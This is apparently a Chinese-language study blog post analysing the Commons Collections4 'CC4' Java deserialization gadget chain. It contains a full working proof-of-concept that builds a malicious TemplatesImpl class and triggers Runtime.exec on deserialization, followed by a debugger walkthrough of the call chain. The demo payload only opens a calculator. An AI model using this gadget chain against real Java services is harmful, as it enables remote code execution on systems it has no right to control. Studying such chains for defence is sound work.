Commons Collections4

0x01 前言

看完P牛的java安全漫谈顺手回来写一下CC4，看了一些网上大佬的文章了解了一下CC4的改动。CC2和CC4很像并且二者都是在CommonsColletcions4版本去利用的，也可以说是CC2和CC3的结合体(小声bibi：又一个结合体)，在原来CC2的基础上改一下POC。

0x02 POC

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javax.xml.transform.Templates;


public class CC4 {
    public static void setField(final Object obj , final String fieldname , final Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception {
        ClassPool classPool=ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass evil = classPool.makeClass("evil");
        evil.setSuperclass(classPool.get(AbstractTranslet.class.getName()));       evil.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\");");
        byte[] bytes = evil.toBytecode();
        byte[][] evilcodes = new byte[][]{bytes};

        TemplatesImpl templatesImpl = new TemplatesImpl();
        setField(templatesImpl,"_bytecodes",evilcodes);
        setField(templatesImpl,"_name","eviltest");
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl})
            };
            Transformer chainedTransformer = new ChainedTransformer(transformers);
            TransformingComparator comparatorevil = new TransformingComparator(chainedTransformer);
            PriorityQueue<Integer> queue = new PriorityQueue<Integer>(2);
            queue.add(1);
            queue.add(2); 
        setField(queue,"comparator",comparatorevil);
        setField(queue,"queue",new Object[]{templatesImpl,templatesImpl});

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(barr);
        outputStream.writeObject(queue);
        outputStream.close();

        ObjectInputStream inputStream =new ObjectInputStream(new 		ByteArrayInputStream(barr.toByteArray()));
        inputStream.readObject();

    }
}


0x03 分析

从上面修改后的POC可以看出CC4沿用了CC2的PriorityQueue的那条利用链，唯一改动的地方就是中间部分

Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl})
            };
            Transformer chainedTransformer = new ChainedTransformer(transformers);
            TransformingComparator comparatorevil = new TransformingComparator(chainedTransformer);


这部分是从CC3拿来用的，这里稍微改了一下，CC3用的是LzayMap#decorate，我们这里利用了CC2用到的CommonsColletcions4特有的TransformingComparator二次修饰了chainedTransformer，下面我们就整体调试分析一下

老规矩断点打在 PriorityQueue 的readObject处开始

调用heapify方法继续跟进

这里的调用流程和CC2一样，heapify调用了siftDown方法，继续跟进

进入siftDown方法，这里的comparator是我们可控的

这里的comparator为我们构造的好的TransformingComparator，使其调用TransformingComparator#compare

这里顺利进入TransformingComparator#compare方法并且经过TransformingComparator修饰的我们构造好的chainedtransformer在这里调用了他的transform方法

继续跟进，将ConstantTransformer修饰的TrAXFilter类对象作为下一轮参数传入后面的

跟到TransformingComparator的transform传入我们上一步得到的TrAXFilter通过反射实例化

这里的this.iParamTypes就是Templates，this.iArgs就是我们构造的恶意类对象

这里就是TrAXFilter获取Templates构造方法，然后实例化该构造方法并且传入了我们的构造的templates

里面又调用了newTransformer方法正好进入了TemplatesImpl的newtransformer，进而调用getTransletInstance，实例化恶意类弹出计算器


0x04 最后

CC4就是在CC3和CC2的基础上稍微改动了一点变化不大，这篇分析就当是对CC3和CC2的复习吧。每调试一次理解就会加深一点。道阻且长一起共勉。
